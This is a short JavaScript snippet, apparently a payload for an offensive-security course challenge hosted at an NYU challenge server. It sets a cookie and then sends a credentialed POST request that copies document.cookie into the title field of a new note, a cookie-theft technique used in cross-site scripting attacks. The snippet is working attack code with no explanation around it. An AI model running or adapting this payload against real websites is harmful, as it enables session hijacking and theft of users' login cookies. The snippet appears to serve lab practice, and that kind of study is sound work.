document.cookie = 'CHALBROKER_USER_ID=lmm864';
fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded"
  },
  "body": "title=" + document.cookie + "&content=TESTAUTO2&submit=save",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
